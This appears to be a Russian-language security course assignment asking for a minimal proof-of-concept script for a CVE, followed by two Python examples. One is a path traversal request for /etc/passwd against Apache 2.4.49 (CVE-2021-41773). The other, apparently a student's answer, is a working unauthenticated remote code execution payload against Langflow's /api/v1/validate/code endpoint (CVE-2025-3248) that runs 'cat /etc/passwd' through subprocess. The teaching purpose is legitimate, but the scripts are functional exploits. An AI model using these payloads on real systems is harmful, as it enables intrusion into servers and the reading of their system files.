Найдите описание CVE-уязвимости (common vulnerabilities and exposures)
и напишие минимальный PoC-скрипт (proof of concept), который эмулирует
использование уязвимости (можно без её активации).
В скрипте достаточно имитировать взаимодействие, например,
формирование запроса к условной уязвимой точке, и выводить сообщение
о потенциальной атаке.
Пример выполнения задания

CVE-2021-41773 — уязвимость обхода пути (Path Traversal) в Apache HTTP
Server 2.4.49, позволяющая атакующему читать произвольные файлы на
сервере.
Минимальный PoC-скрипт (пример):
import requests
url = "http://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
response = requests.get(url)
if response.status_code == 200:
print("[+] Потенциальная уязвимость обнаружена. Ответ сервера:")

else:
print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)

#### CVE-2025-3248 (Langflow Unauthenticated RCE)
 это критическая уязвимость удаленного выполнения кода (RCE) без аутентификации в Langflow, популярном open-source инструменте для создания AI-воркфлоу на базе Python. Уязвимость затрагивает все версии до 1.3.0 (выпущенные за два года до патча от 31 марта 2025 года) и позволяет атакующему выполнить произвольный код на сервере через POST-запрос к эндпоинту /api/v1/validate/code.

```python
import requests

# URL уязвимого Langflow-сервера
target_url = "http://localhost:8000/api/v1/validate/code"

headers = {"Content-Type": "application/json"}

# Вредоносный код: чтение /etc/passwd через исключение
payload_code = 'def foo(cmd=exec("raise Exception(__import__(\\"subprocess\\").check_output([\\"cat\\", \\"/etc/passwd\\"]))")):\n  pass'

data = {"code": payload_code}

response = requests.post(target_url, json=data, headers=headers)
print(response.text)  # Вывод: ошибка с содержимым /etc/passwd
```
